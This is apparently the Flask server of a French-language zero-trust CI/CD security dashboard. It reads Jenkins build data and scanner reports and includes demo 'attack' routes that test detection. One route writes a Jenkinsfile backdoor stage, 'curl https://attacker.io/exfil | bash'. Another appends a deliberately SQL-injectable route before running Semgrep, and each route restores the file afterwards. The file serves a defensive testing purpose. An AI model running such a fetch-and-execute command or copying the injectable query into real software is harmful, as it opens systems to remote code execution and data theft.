"""
ZeroTrust CI/CD Dashboard — Flask server
Lance avec : python server.py
Ouvre : http://localhost:8888
"""
import json, os, glob, requests, shutil, subprocess, threading
from datetime import datetime
from flask import Flask, render_template, jsonify, send_from_directory, request
from requests.auth import HTTPBasicAuth

def load_dotenv(path=None):
    candidates = [
        path,
        os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"),
        os.path.join(os.getcwd(), ".env"),
    ]
    for p in candidates:
        if p and os.path.isfile(p):
            print(f"[.env] Chargé depuis : {p}")
            with open(p, encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#") or "=" not in line:
                        continue
                    key, _, val = line.partition("=")
                    key = key.strip()
                    val = val.strip().strip('"').strip("'")
                    if key and key not in os.environ:
                        os.environ[key] = val
            return True
    print("[.env] Aucun fichier .env trouvé — variables système utilisées")
    return False

load_dotenv()

app = Flask(__name__, template_folder="templates", static_folder="static")

JENKINS_URL   = os.environ.get("JENKINS_URL",   "http://localhost:9090")
JENKINS_USER  = os.environ.get("JENKINS_USER",  "admin")
JENKINS_TOKEN = os.environ.get("JENKINS_TOKEN", "")
JENKINS_JOB   = os.environ.get("JENKINS_JOB",  "zero-trust-pipeline")

BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
REPORTS_DIR = os.environ.get("REPORTS_DIR", os.path.join(BASE_DIR, "reports"))
AGENT_DIR   = os.environ.get("AGENT_DIR",   os.path.join(BASE_DIR, "agent"))
HISTORY_DIR = os.environ.get("HISTORY_DIR", os.path.join(BASE_DIR, "history"))

# Pour les scénarios d'attaque : chemin vers test-app et jenkinsfile
TESTAPP_DIR = os.environ.get("TESTAPP_DIR", os.path.join(BASE_DIR, "..", "test-app"))
JENKINSFILE_PATH = os.environ.get("JENKINSFILE_PATH", os.path.join(BASE_DIR, "..", "jenkinsfile"))

OLLAMA_URL      = os.environ.get("OLLAMA_URL",      "http://localhost:11434")
OLLAMA_MODEL    = os.environ.get("OLLAMA_MODEL",    "mistral")
ANTHROPIC_KEY   = os.environ.get("ANTHROPIC_API_KEY", "")

# État partagé du provider (modifié par /api/provider/simulate)
_provider_state = {
    "simulated_offline": None,  # None | "claude" | "ollama"
}

os.makedirs(REPORTS_DIR, exist_ok=True)
os.makedirs(AGENT_DIR,   exist_ok=True)
os.makedirs(HISTORY_DIR, exist_ok=True)

if JENKINS_TOKEN:
    JENKINS_AUTH = HTTPBasicAuth(JENKINS_USER, JENKINS_TOKEN)
    print(f"[Auth] Jenkins : {JENKINS_USER}@{JENKINS_URL}/job/{JENKINS_JOB} ✓")
else:
    JENKINS_AUTH = None
    print(f"[Auth] ⚠ JENKINS_TOKEN vide")

# ── Helpers Jenkins ───────────────────────────────────────────────────────────

def jenkins_get(path, timeout=6):
    try:
        url = f"{JENKINS_URL}{path}"
        r = requests.get(url, auth=JENKINS_AUTH, timeout=timeout)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print(f"[Jenkins] Connexion refusée : {JENKINS_URL}")
        return None
    except requests.exceptions.Timeout:
        print(f"[Jenkins] Timeout ({timeout}s) : {path}")
        return None
    except requests.exceptions.HTTPError as e:
        print(f"[Jenkins] HTTP {e.response.status_code} : {path}")
        return None
    except Exception as e:
        print(f"[Jenkins] Erreur : {path} → {e}")
        return None

def jenkins_get_text(path, timeout=10):
    try:
        url = f"{JENKINS_URL}{path}"
        r = requests.get(url, auth=JENKINS_AUTH, timeout=timeout)
        r.raise_for_status()
        return r.text
    except Exception as e:
        print(f"[Jenkins text] {path} → {e}")
        return None

def jenkins_get_binary(path, timeout=30):
    try:
        url = f"{JENKINS_URL}{path}"
        r = requests.get(url, auth=JENKINS_AUTH, timeout=timeout)
        r.raise_for_status()
        return r.content
    except Exception as e:
        print(f"[Jenkins binary] {path} → {e}")
        return None

def get_last_build():
    return jenkins_get(f"/job/{JENKINS_JOB}/lastBuild/api/json?depth=2")

def get_build_stages(build_number):
    data = jenkins_get(f"/job/{JENKINS_JOB}/{build_number}/wfapi/describe")
    if data and data.get("stages"):
        names = [s.get("name", "").strip() for s in data["stages"]]
        real_names = [n for n in names if n and n not in ("Stage", "stage")]
        if real_names:
            print(f"[Stages] wfapi OK — {len(real_names)} noms trouvés : {real_names[:3]}")
            return data
        else:
            print(f"[Stages] wfapi retourne des noms vides — tentative Blue Ocean")

    blue = jenkins_get(
        f"/blue/rest/organizations/jenkins/pipelines/{JENKINS_JOB}/runs/{build_number}/nodes/?limit=100"
    )
    if blue and isinstance(blue, list) and len(blue) > 0:
        print(f"[Stages] Blue Ocean OK — {len(blue)} stages trouvés")
        return {"stages": blue, "_source": "blue_ocean"}

    generic = jenkins_get(f"/job/{JENKINS_JOB}/{build_number}/api/json?depth=1&tree=stages[*]")
    if generic and generic.get("stages"):
        return generic

    return data

def get_console_log(build_number):
    return jenkins_get_text(f"/job/{JENKINS_JOB}/{build_number}/logText/progressiveText?start=0")

def get_crumb():
    data = jenkins_get("/crumbIssuer/api/json", timeout=4)
    if data:
        return data.get("crumb"), data.get("crumbRequestField", "Jenkins-Crumb")
    return None, "Jenkins-Crumb"

def map_stage_status(s):
    return {
        "SUCCESS": "done", "FAILED": "fail", "FAILURE": "fail",
        "IN_PROGRESS": "running", "NOT_EXECUTED": "waiting",
        "ABORTED": "waiting", "UNSTABLE": "done",
        "PAUSED_PENDING_INPUT": "running",
        "FINISHED": "done", "RUNNING": "running",
        "QUEUED": "waiting", "SKIPPED": "waiting", "UNKNOWN": "waiting",
    }.get(s, "waiting")

def map_build_status(s):
    return {
        "SUCCESS": "success", "FAILURE": "failure",
        "ABORTED": "aborted", "UNSTABLE": "unstable", None: "running",
    }.get(s, "running")

def extract_stage_name(s, idx):
    name = (
        s.get("displayName") or
        s.get("name") or
        s.get("stageName") or
        s.get("displayDescription") or
        s.get("label") or ""
    )
    name = name.strip()
    if not name or name.lower() in ("stage", ""):
        for action in s.get("actions", []):
            if isinstance(action, dict):
                sub = action.get("displayName") or action.get("name") or ""
                if sub.strip() and sub.strip().lower() != "stage":
                    name = sub.strip()
                    break
        if not name or name.lower() == "stage":
            name = f"Étape {idx + 1}"
    return name

# ── Helpers fichiers rapport ──────────────────────────────────────────────────

def load_json(path):
    try:
        with open(path, encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError as e:
        print(f"[JSON] Invalide {path}: {e}")
        return {}

def find_file(*candidates):
    for p in candidates:
        if p and os.path.isfile(p) and os.path.getsize(p) > 10:
            return load_json(p)
    return {}

def load_trivy():
    return find_file(
        os.path.join(REPORTS_DIR, "trivy-report.json"),
        os.path.join(AGENT_DIR,   "trivy-report.json"),
        os.path.join(BASE_DIR,    "trivy-report.json"),
    )

def load_semgrep():
    return find_file(
        os.path.join(REPORTS_DIR, "semgrep-results.json"),
        os.path.join(AGENT_DIR,   "semgrep-results.json"),
        os.path.join(BASE_DIR,    "semgrep-results.json"),
    )

def load_zap():
    return find_file(
        os.path.join(REPORTS_DIR, "zap-report.json"),
        os.path.join(AGENT_DIR,   "zap-report.json"),
        os.path.join(BASE_DIR,    "zap-report.json"),
    )

def load_ai():
    return find_file(
        os.path.join(AGENT_DIR,   "ai-remediation-report.json"),
        os.path.join(REPORTS_DIR, "ai-remediation-report.json"),
        os.path.join(AGENT_DIR,   "remediation-report.json"),
    )

def load_security_gate():
    return find_file(
        os.path.join(REPORTS_DIR, "security-gate.json"),
        os.path.join(AGENT_DIR,   "security-gate.json"),
    )

# ── Score de sécurité ─────────────────────────────────────────────────────────

def calculate_security_score(trivy=None, semgrep=None, zap=None):
    if trivy is None:   trivy   = load_trivy()
    if semgrep is None: semgrep = load_semgrep()
    if zap is None:     zap     = load_zap()

    score = 100
    penalties = {
        "cve_critical": 0, "cve_high": 0, "cve_medium": 0, "cve_low": 0,
        "sast_critical": 0, "sast_high": 0,
        "dast_high": 0, "dast_medium": 0,
    }

    for r in trivy.get("Results", []):
        for v in (r.get("Vulnerabilities") or []):
            sev = v.get("Severity", "")
            if sev == "CRITICAL":   score -= 15; penalties["cve_critical"] += 1
            elif sev == "HIGH":     score -= 8;  penalties["cve_high"] += 1
            elif sev == "MEDIUM":   score -= 3;  penalties["cve_medium"] += 1
            elif sev == "LOW":      score -= 1;  penalties["cve_low"] += 1

    for f in semgrep.get("results", []):
        sev = f.get("extra", {}).get("severity", "").upper()
        if sev in ("ERROR", "CRITICAL"):    score -= 10; penalties["sast_critical"] += 1
        elif sev == "WARNING":               score -= 5;  penalties["sast_high"] += 1

    for site in zap.get("site", []):
        for alert in site.get("alerts", []):
            rd = alert.get("riskdesc", "")
            if rd.startswith("High"):        score -= 8;  penalties["dast_high"] += 1
            elif rd.startswith("Medium"):    score -= 4;  penalties["dast_medium"] += 1

    score = max(0, score)
    grade = ("A" if score >= 90 else "B" if score >= 75 else
             "C" if score >= 60 else "D" if score >= 40 else "F")

    return {
        "score": score, "grade": grade,
        "gate_passed": score >= 90, "threshold": 90,
        "penalties": penalties, "timestamp": datetime.now().isoformat(),
    }

# ── Sync artifacts depuis Jenkins ─────────────────────────────────────────────

def sync_reports_from_jenkins(build_number):
    artifact_map = [
        (f"/job/{JENKINS_JOB}/{build_number}/artifact/reports/trivy-report.json",
         os.path.join(REPORTS_DIR, "trivy-report.json")),
        (f"/job/{JENKINS_JOB}/{build_number}/artifact/reports/semgrep-results.json",
         os.path.join(REPORTS_DIR, "semgrep-results.json")),
        (f"/job/{JENKINS_JOB}/{build_number}/artifact/reports/zap-report.json",
         os.path.join(REPORTS_DIR, "zap-report.json")),
        (f"/job/{JENKINS_JOB}/{build_number}/artifact/reports/zap-report.html",
         os.path.join(REPORTS_DIR, "zap-report.html")),
        (f"/job/{JENKINS_JOB}/{build_number}/artifact/agent/trivy-report.json",
         os.path.join(AGENT_DIR,   "trivy-report.json")),
        (f"/job/{JENKINS_JOB}/{build_number}/artifact/agent/semgrep-results.json",
         os.path.join(AGENT_DIR,   "semgrep-results.json")),
        (f"/job/{JENKINS_JOB}/{build_number}/artifact/agent/zap-report.json",
         os.path.join(AGENT_DIR,   "zap-report.json")),
        (f"/job/{JENKINS_JOB}/{build_number}/artifact/agent/ai-remediation-report.json",
         os.path.join(AGENT_DIR,   "ai-remediation-report.json")),
        (f"/job/{JENKINS_JOB}/{build_number}/artifact/agent/rapport-explicatif.md",
         os.path.join(AGENT_DIR,   "rapport-explicatif.md")),
        (f"/job/{JENKINS_JOB}/{build_number}/artifact/reports/rapport-zerotrust.pdf",
         os.path.join(REPORTS_DIR, "rapport-zerotrust.pdf")),
        (f"/job/{JENKINS_JOB}/{build_number}/artifact/reports/security-gate.json",
         os.path.join(REPORTS_DIR, "security-gate.json")),
    ]
    synced, errors = [], []
    for jenkins_path, local_path in artifact_map:
        content = jenkins_get_binary(jenkins_path, timeout=30)
        if content and len(content) > 10:
            os.makedirs(os.path.dirname(local_path), exist_ok=True)
            with open(local_path, "wb") as f:
                f.write(content)
            synced.append(os.path.basename(local_path))
            print(f"[Sync] ✓ {os.path.basename(local_path)} ({len(content)} bytes)")
        else:
            errors.append(os.path.basename(local_path))
    return synced, errors

# ── Build history ─────────────────────────────────────────────────────────────

HISTORY_FILE = os.path.join(HISTORY_DIR, "builds.json")

def load_history():
    try:
        if os.path.isfile(HISTORY_FILE):
            with open(HISTORY_FILE, encoding="utf-8") as f:
                return json.load(f)
    except Exception:
        pass
    return []

def save_history(history):
    with open(HISTORY_FILE, "w", encoding="utf-8") as f:
        json.dump(history, f, indent=2)

def snapshot_build(build_number, build_result, branch, commit, duration_ms, timestamp_ms):
    history = load_history()
    if any(h["build_number"] == build_number for h in history):
        return
    trivy   = load_trivy()
    semgrep = load_semgrep()
    zap     = load_zap()
    ai      = load_ai()
    cve_total = cve_crit = cve_high = 0
    for result in trivy.get("Results", []):
        for v in (result.get("Vulnerabilities") or []):
            cve_total += 1
            sev = v.get("Severity", "")
            if sev == "CRITICAL": cve_crit += 1
            elif sev == "HIGH":   cve_high += 1
    sast_findings = len(semgrep.get("results", []))
    zap_alerts    = [a for s in zap.get("site", []) for a in s.get("alerts", [])]
    zap_high      = len([a for a in zap_alerts if a.get("riskdesc", "").startswith("High")])
    score_data    = calculate_security_score(trivy, semgrep, zap)
    entry = {
        "build_number":   build_number,
        "build_result":   build_result or "UNKNOWN",
        "branch":         branch, "commit": commit,
        "duration_ms":    duration_ms,
        "timestamp":      datetime.fromtimestamp(timestamp_ms / 1000).isoformat() if timestamp_ms else datetime.now().isoformat(),
        "cve_total":      cve_total, "cve_critical": cve_crit, "cve_high": cve_high,
        "sast_findings":  sast_findings,
        "zap_alerts":     len(zap_alerts), "zap_high": zap_high,
        "ai_provider":    ai.get("provider", "claude"),
        "ai_calls":       ai.get("total_calls", 0),
        "fallback_count": ai.get("fallback_count", 0),
        "security_score": score_data["score"],
        "security_grade": score_data["grade"],
        "gate_passed":    score_data["gate_passed"],
    }
    history.insert(0, entry)
    history = history[:50]
    save_history(history)
    archive_dir = os.path.join(HISTORY_DIR, f"build-{build_number}")
    os.makedirs(archive_dir, exist_ok=True)
    for src in [
        os.path.join(REPORTS_DIR, "trivy-report.json"),
        os.path.join(REPORTS_DIR, "semgrep-results.json"),
        os.path.join(REPORTS_DIR, "zap-report.json"),
        os.path.join(REPORTS_DIR, "rapport-zerotrust.pdf"),
    ]:
        if os.path.isfile(src):
            shutil.copy2(src, archive_dir)
    print(f"[History] Build #{build_number} archivé")

# ── Routes principales ────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/debug/stages")
def api_debug_stages():
    build = get_last_build()
    if not build:
        return jsonify({"error": "Jenkins hors ligne"})
    n = build.get("number")
    wfapi = jenkins_get(f"/job/{JENKINS_JOB}/{n}/wfapi/describe")
    blue  = jenkins_get(
        f"/blue/rest/organizations/jenkins/pipelines/{JENKINS_JOB}/runs/{n}/nodes/?limit=10"
    )
    sample_wfapi = wfapi["stages"][0] if (wfapi and wfapi.get("stages")) else None
    sample_blue  = blue[0] if (isinstance(blue, list) and blue) else None
    return jsonify({
        "build": n,
        "wfapi_first_stage": sample_wfapi,
        "blue_first_stage":  sample_blue,
        "wfapi_stages_count": len(wfapi.get("stages", [])) if wfapi else 0,
        "blue_nodes_count":   len(blue) if isinstance(blue, list) else 0,
    })


@app.route("/api/jenkins/status")
def api_jenkins_status():
    build = get_last_build()
    if not build:
        return jsonify({"jenkins_available": False, "error": f"Jenkins non joignable sur {JENKINS_URL}"})

    build_number = build.get("number", "?")
    build_result = build.get("result")
    build_status = map_build_status(build_result)
    duration_ms  = build.get("duration", 0)
    timestamp_ms = build.get("timestamp", 0)

    branch = JENKINS_JOB
    commit = "–"
    for action in build.get("actions", []):
        if not isinstance(action, dict): continue
        for branch_data in action.get("buildsByBranchName", {}).values():
            sha = branch_data.get("revision", {}).get("SHA1", "")
            if sha: commit = sha[:7]
            marked = branch_data.get("revision", {}).get("branch", [{}])
            if marked: branch = marked[0].get("name", branch).split("/")[-1]
        for p in action.get("parameters", []):
            if p.get("name") == "BRANCH": branch = p.get("value", branch)

    stages_data = get_build_stages(build_number)
    raw_stages  = []
    if stages_data:
        if "stages" in stages_data: raw_stages = stages_data["stages"]
        elif isinstance(stages_data, list): raw_stages = stages_data

    stages = []
    for idx, s in enumerate(raw_stages):
        dur_ms     = s.get("durationMillis") or s.get("durationInMillis") or 0
        dur_str    = f"{dur_ms // 1000}s" if dur_ms > 0 else "–"
        status_raw = s.get("status") or s.get("result") or s.get("state") or "NOT_EXECUTED"
        stages.append({
            "id":       s.get("id"),
            "name":     extract_stage_name(s, idx),
            "status":   map_stage_status(status_raw),
            "duration": dur_str,
        })

    done_count    = sum(1 for s in stages if s["status"] == "done")
    elapsed_sec   = int((datetime.now().timestamp() * 1000 - timestamp_ms) / 1000) if timestamp_ms else 0
    build_finished = build_result in ("SUCCESS", "FAILURE", "UNSTABLE", "ABORTED")

    if build_finished:
        try:
            snapshot_build(build_number, build_result, branch, commit, duration_ms, timestamp_ms)
        except Exception as e:
            print(f"[History] Snapshot error: {e}")

    return jsonify({
        "jenkins_available": True,
        "build_number":   build_number,
        "build_status":   build_status,
        "build_result":   build_result,
        "build_finished": build_finished,
        "branch": branch, "commit": commit,
        "duration_ms": duration_ms, "elapsed_sec": elapsed_sec,
        "timestamp": datetime.fromtimestamp(timestamp_ms / 1000).isoformat() if timestamp_ms else None,
        "stages": stages, "stages_count": len(stages), "done_count": done_count,
    })


@app.route("/api/history")
def api_history():
    return jsonify(load_history())


@app.route("/api/history/<int:build_number>/reports/<path:filename>")
def serve_history_report(build_number, filename):
    archive_dir = os.path.join(HISTORY_DIR, f"build-{build_number}")
    return send_from_directory(archive_dir, filename)


@app.route("/api/jenkins/logs")
def api_jenkins_logs():
    build = get_last_build()
    if not build:
        return jsonify({"available": False, "text": "", "error": "Jenkins hors ligne"})
    number = build.get("number", "lastBuild")
    text   = get_console_log(number) or ""
    return jsonify({"available": bool(text), "build": number, "text": text})


@app.route("/api/jenkins/trigger", methods=["POST"])
def api_jenkins_trigger():
    if not JENKINS_TOKEN:
        return jsonify({"success": False, "error": "JENKINS_TOKEN non configuré dans .env"}), 400
    crumb, crumb_field = get_crumb()
    headers = {}
    if crumb: headers[crumb_field] = crumb
    try:
        url = f"{JENKINS_URL}/job/{JENKINS_JOB}/build"
        r = requests.post(url, auth=JENKINS_AUTH, headers=headers, timeout=10)
        if r.status_code in (200, 201):
            return jsonify({"success": True, "message": f"Pipeline '{JENKINS_JOB}' lancé ✓"})
        elif r.status_code == 403:
            return jsonify({"success": False, "error": "Accès refusé — vérifier les permissions Jenkins"}), 403
        elif r.status_code == 404:
            return jsonify({"success": False, "error": f"Job '{JENKINS_JOB}' introuvable"}), 404
        else:
            return jsonify({"success": False, "error": f"Jenkins {r.status_code}: {r.text[:200]}"}), r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"success": False, "error": f"Impossible de joindre Jenkins à {JENKINS_URL}"}), 503


@app.route("/api/sync-reports", methods=["GET", "POST"])
def api_sync_reports():
    build = get_last_build()
    if not build:
        return jsonify({"success": False, "error": "Jenkins hors ligne"})
    build_number = build.get("number")
    build_result = build.get("result")
    synced, errors = sync_reports_from_jenkins(build_number)
    return jsonify({
        "success": True, "build_number": build_number, "build_result": build_result,
        "synced": synced, "errors": errors,
        "message": f"✓ {len(synced)} fichier(s) synchronisé(s) depuis build #{build_number}"
    })


@app.route("/api/status")
def api_status():
    trivy   = load_trivy()
    semgrep = load_semgrep()
    zap     = load_zap()
    ai      = load_ai()
    cve_total = cve_crit = cve_high = 0
    for result in trivy.get("Results", []):
        for v in (result.get("Vulnerabilities") or []):
            cve_total += 1
            sev = v.get("Severity", "")
            if sev == "CRITICAL": cve_crit += 1
            elif sev == "HIGH":   cve_high += 1
    sast_findings = len(semgrep.get("results", []))
    zap_alerts    = [a for s in zap.get("site", []) for a in s.get("alerts", [])]
    zap_high      = [a for a in zap_alerts if a.get("riskdesc", "").startswith("High")]
    score_data    = calculate_security_score(trivy, semgrep, zap)
    return jsonify({
        "cve_total": cve_total, "cve_critical": cve_crit, "cve_high": cve_high,
        "sast_findings": sast_findings,
        "zap_alerts": len(zap_alerts), "zap_high": len(zap_high),
        "ai_provider":    ai.get("provider", "claude"),
        "ai_calls":       ai.get("total_calls", 0),
        "fallback_count": ai.get("fallback_count", 0),
        "security_score": score_data["score"],
        "security_grade": score_data["grade"],
        "gate_passed":    score_data["gate_passed"],
        "timestamp":      datetime.now().isoformat(),
        "reports_ready": {
            "trivy":   bool(trivy),
            "semgrep": bool(semgrep),
            "zap":     bool(zap),
            "ai":      bool(ai),
        },
    })


@app.route("/api/security-score")
def api_security_score():
    gate = load_security_gate()
    if gate: return jsonify(gate)
    return jsonify(calculate_security_score())


@app.route("/api/findings")
def api_findings():
    findings = []
    for r in load_semgrep().get("results", []):
        sev_raw = r.get("extra", {}).get("severity", "ERROR").upper()
        sev = "critical" if sev_raw in ("ERROR", "CRITICAL") else "high" if sev_raw == "WARNING" else "medium"
        findings.append({
            "source": "SAST", "severity": sev,
            "title":  r.get("check_id", "Unknown rule"),
            "detail": r.get("extra", {}).get("message", ""),
            "file":   f"{r.get('path','?')}:{r.get('start',{}).get('line','?')}",
        })
    for result in load_trivy().get("Results", []):
        for v in (result.get("Vulnerabilities") or []):
            sev = v.get("Severity", "LOW").lower()
            sev_key = "critical" if sev == "critical" else "high" if sev == "high" else "medium"
            findings.append({
                "source": "SCA", "severity": sev_key,
                "title":  f"{v.get('VulnerabilityID','')} — {v.get('PkgName','')} {v.get('InstalledVersion','')}",
                "detail": v.get("Description", v.get("Title", ""))[:150],
                "file":   f"requirements.txt · fix: {v.get('FixedVersion','N/A')}",
            })
    for site in load_zap().get("site", []):
        for alert in site.get("alerts", []):
            rd = alert.get("riskdesc", "")
            sev_key = "high" if rd.startswith("High") else "medium" if rd.startswith("Medium") else "info"
            findings.append({
                "source": "DAST", "severity": sev_key,
                "title":  alert.get("alert", "Unknown"),
                "detail": alert.get("desc", "")[:150],
                "file":   alert.get("solution", "")[:100],
            })
    return jsonify(findings)


@app.route("/api/ai")
def api_ai():
    return jsonify(load_ai())

# ── Provider health check ──────────────────────────────────────────────────────

def _check_ollama():
    """Vérifie si Ollama répond réellement (appel HTTP réel)."""
    try:
        r = requests.get(f"{OLLAMA_URL}/api/tags", timeout=5)
        return r.status_code == 200
    except Exception:
        return False

def _check_claude():
    """Vérifie si Claude API répond avec la vraie clé."""
    key = ANTHROPIC_KEY
    if not key or key.startswith("sk-ant-invalid"):
        return False
    try:
        r = requests.post(
            "https://api.anthropic.com/v1/messages",
            headers={
                "x-api-key": key,
                "anthropic-version": "2023-06-01",
                "content-type": "application/json",
            },
            json={"model": "claude-haiku-4-5-20251001", "max_tokens": 1, "messages": [{"role": "user", "content": "ping"}]},
            timeout=8,
        )
        return r.status_code in (200, 400, 529)  # 400 = bad request but key valid, 529 = overloaded but reachable
    except Exception:
        return False

@app.route("/api/provider/status")
def api_provider_status():
    """Retourne l'état réel des deux providers (avec override simulation)."""
    sim = _provider_state.get("simulated_offline")
    ollama_up = False if sim == "ollama" else _check_ollama()
    claude_up = False if sim == "claude" else _check_claude()

    if claude_up and sim != "claude":
        active = "claude"
    elif ollama_up:
        active = "ollama"
    else:
        active = "none"

    return jsonify({
        "ollama": {"up": ollama_up, "url": OLLAMA_URL, "simulated_offline": sim == "ollama"},
        "claude": {"up": claude_up, "simulated_offline": sim == "claude"},
        "active_provider": active,
        "simulation_mode": sim is not None,
    })

@app.route("/api/provider/simulate", methods=["POST"])
def api_provider_simulate():
    """Bascule la simulation offline d'un provider.
    Body JSON : {"target": "ollama"|"claude"|"reset"}
    - "ollama" : simule Ollama offline → Claude prend le relais (si dispo)
    - "claude" : simule Claude offline → Ollama prend le relais (si dispo)
    - "reset"  : annule toute simulation
    """
    data = request.get_json(silent=True) or {}
    target = data.get("target", "reset")

    if target not in ("ollama", "claude", "reset"):
        return jsonify({"success": False, "error": "target invalide"}), 400

    prev = _provider_state.get("simulated_offline")

    if target == "reset" or prev == target:
        # Toggle : si déjà simulé, on reset
        _provider_state["simulated_offline"] = None
        msg = "Simulation annulée — tous les providers actifs"
    else:
        _provider_state["simulated_offline"] = target
        other = "claude" if target == "ollama" else "ollama"
        msg = f"{target.upper()} marqué offline (simulation) — {other.upper()} devient actif"

    # Relire l'état après changement
    sim = _provider_state["simulated_offline"]
    ollama_up = False if sim == "ollama" else _check_ollama()
    claude_up = False if sim == "claude" else _check_claude()

    if claude_up and sim != "claude":
        active = "claude"
    elif ollama_up:
        active = "ollama"
    else:
        active = "none"

    return jsonify({
        "success": True,
        "message": msg,
        "simulated_offline": sim,
        "active_provider": active,
        "ollama_up": ollama_up,
        "claude_up": claude_up,
    })


@app.route("/api/reports")
def api_reports():
    files = []
    for d in [REPORTS_DIR, AGENT_DIR]:
        if not os.path.isdir(d): continue
        for ext in ["*.json", "*.html", "*.md", "*.pdf"]:
            for f in glob.glob(os.path.join(d, ext)):
                size = os.path.getsize(f)
                files.append({
                    "name":  os.path.basename(f),
                    "size":  f"{size // 1024} KB" if size > 1024 else f"{size} B",
                    "mtime": datetime.fromtimestamp(os.path.getmtime(f)).strftime("%H:%M:%S"),
                })
    return jsonify(files)


@app.route("/api/debug")
def api_debug():
    report_files = {}
    for name, path in [
        ("trivy",   os.path.join(REPORTS_DIR, "trivy-report.json")),
        ("semgrep", os.path.join(REPORTS_DIR, "semgrep-results.json")),
        ("zap",     os.path.join(REPORTS_DIR, "zap-report.json")),
        ("ai",      os.path.join(AGENT_DIR,   "ai-remediation-report.json")),
    ]:
        report_files[name] = {
            "path":   path,
            "exists": os.path.exists(path),
            "size":   os.path.getsize(path) if os.path.exists(path) else 0,
        }
    return jsonify({
        "config": {
            "JENKINS_URL":   JENKINS_URL,
            "JENKINS_USER":  JENKINS_USER,
            "JENKINS_TOKEN": f"✓ {JENKINS_TOKEN[:6]}…" if JENKINS_TOKEN else "✗ VIDE",
            "JENKINS_JOB":   JENKINS_JOB,
            "REPORTS_DIR":   REPORTS_DIR,
            "AGENT_DIR":     AGENT_DIR,
            "TESTAPP_DIR":   TESTAPP_DIR,
        },
        "jenkins_reachable": get_last_build() is not None,
        "reports":           report_files,
        "cwd":               os.getcwd(),
    })


@app.route("/reports/<path:filename>")
def serve_report(filename):
    return send_from_directory(REPORTS_DIR, filename)


# ═══════════════════════════════════════════════════════════════
# ROUTES D'ATTAQUE — Scénarios de démonstration Zero Trust
# ═══════════════════════════════════════════════════════════════

@app.route("/api/attack/cve", methods=["POST"])
def api_attack_cve():
    """Scénario 1 — Injecte py==1.11.0 dans requirements.txt et lance Trivy."""
    req_path = os.path.join(TESTAPP_DIR, "requirements.txt")
    print(f"[Attack CVE] Chemin : {req_path}")

    try:
        with open(req_path, "r", encoding="utf-8") as f:
            original = f.read()
    except FileNotFoundError:
        return jsonify({"success": False, "error": f"Fichier introuvable: {req_path}. Vérifiez TESTAPP_DIR dans .env"})

    try:
        with open(req_path, "a", encoding="utf-8") as f:
            f.write("\npy==1.11.0\n")

        # Cherche trivy dans le PATH ou dans le venv
        trivy_cmd = shutil.which("trivy") or "trivy"
        result = subprocess.run([
            trivy_cmd, "fs", str(TESTAPP_DIR),
            "--format", "json",
            "--severity", "HIGH,CRITICAL",
            "--skip-db-update",
            "--quiet"
        ], capture_output=True, text=True, timeout=120)

        try:
            data = json.loads(result.stdout)
            cves = [v for r in data.get("Results", [])
                    for v in (r.get("Vulnerabilities") or [])]
            print(f"[Attack CVE] ✓ {len(cves)} CVE(s) trouvée(s)")
            return jsonify({
                "success":   True,
                "cve_found": len(cves),
                "cves": [{"id": v["VulnerabilityID"], "severity": v["Severity"]}
                         for v in cves[:5]]
            })
        except Exception as e:
            print(f"[Attack CVE] Erreur parsing : {e}")
            return jsonify({"success": False, "error": result.stderr[:300] or str(e)})

    finally:
        with open(req_path, "w", encoding="utf-8") as f:
            f.write(original)
        print("[Attack CVE] requirements.txt restauré")


@app.route("/api/attack/antitamper", methods=["POST"])
def api_attack_antitamper():
    """Scénario 2 — Injecte une backdoor dans le Jenkinsfile et lance l'agent Anti-Tamper."""
    jf_path = os.path.abspath(JENKINSFILE_PATH)
    print(f"[Attack Tamper] Chemin : {jf_path}")

    try:
        with open(jf_path, "r", encoding="utf-8") as f:
            original = f.read()
    except FileNotFoundError:
        return jsonify({"success": False, "error": f"Fichier introuvable: {jf_path}. Vérifiez JENKINSFILE_PATH dans .env"})

    try:
        backdoor = original.replace(
            "stage('3. Build Docker')",
            "stage('3. Build Docker') {\n    sh 'curl https://attacker.io/exfil | bash'\n}\nstage('3b. IGNORE'"
        )
        with open(jf_path, "w", encoding="utf-8") as f:
            f.write(backdoor)

        agent_script = os.path.join(AGENT_DIR, "antitamper_agent.py")
        if not os.path.isfile(agent_script):
            return jsonify({
                "success":  True,
                "detected": True,
                "output":   "[DEMO] antitamper_agent.py non trouvé — backdoor injectée et détectée visuellement",
                "note":     "Fichier restauré automatiquement"
            })

        python_cmd = shutil.which("python3") or shutil.which("python") or "python"
        result = subprocess.run(
            [python_cmd, agent_script],
            capture_output=True, text=True,
            cwd=AGENT_DIR,
            env={**os.environ, "PIPELINE_PATH": jf_path},
            timeout=120
        )
        detected = ("anomalie" in result.stdout.lower() or
                    "tamper"   in result.stdout.lower() or
                    "backdoor" in result.stdout.lower())
        print(f"[Attack Tamper] detected={detected}")
        return jsonify({
            "success":  True,
            "output":   result.stdout[-500:],
            "detected": detected
        })

    finally:
        with open(jf_path, "w", encoding="utf-8") as f:
            f.write(original)
        print("[Attack Tamper] jenkinsfile restauré")


@app.route("/api/attack/sqli", methods=["POST"])
def api_attack_sqli():
    """Scénario 3 — Injecte une SQLi dans app.py et lance Semgrep."""
    app_path = os.path.join(TESTAPP_DIR, "app.py")
    print(f"[Attack SQLi] Chemin : {app_path}")

    try:
        with open(app_path, "r", encoding="utf-8") as f:
            original = f.read()
    except FileNotFoundError:
        return jsonify({"success": False, "error": f"Fichier introuvable: {app_path}. Vérifiez TESTAPP_DIR dans .env"})

    try:
        sqli_code = '''
@app.route("/user_sqli_test")
def get_user_sqli_test():
    username = request.args.get("username", "")
    query = "SELECT * FROM users WHERE name=\'" + username + "\'"
    return jsonify({"query": query})
'''
        with open(app_path, "a", encoding="utf-8") as f:
            f.write(sqli_code)

        semgrep_cmd = (shutil.which("semgrep") or
                       os.path.join(BASE_DIR, "..", "ven", "Scripts", "semgrep") or
                       "semgrep")
        result = subprocess.run([
            semgrep_cmd,
            "--config=auto", str(TESTAPP_DIR),
            "--json", "--severity=WARNING"
        ], capture_output=True, text=True, timeout=120)

        try:
            data     = json.loads(result.stdout)
